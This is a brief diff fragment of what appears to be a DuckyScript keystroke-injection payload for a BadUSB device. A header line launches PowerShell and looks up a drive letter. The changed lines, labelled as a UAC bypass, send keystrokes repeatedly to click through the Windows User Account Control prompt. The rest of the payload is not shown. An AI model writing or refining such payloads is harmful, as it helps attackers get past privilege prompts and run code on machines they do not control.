@@ -10,9 +10,9 @@ STRING powershell Start-Process powershell { $driveletter = (Get-Volume -FileSys
 ENTER
 
 REM --- UAC bypass, repeated 5 times just in case GUI acts too slow ---
-REPEAT_START 4
+REPEAT_START
 DELAY 900
 LEFT
-DELAY 100
+ENTER
 CTRL ALT SHIFT ENTER
 REPEAT 4
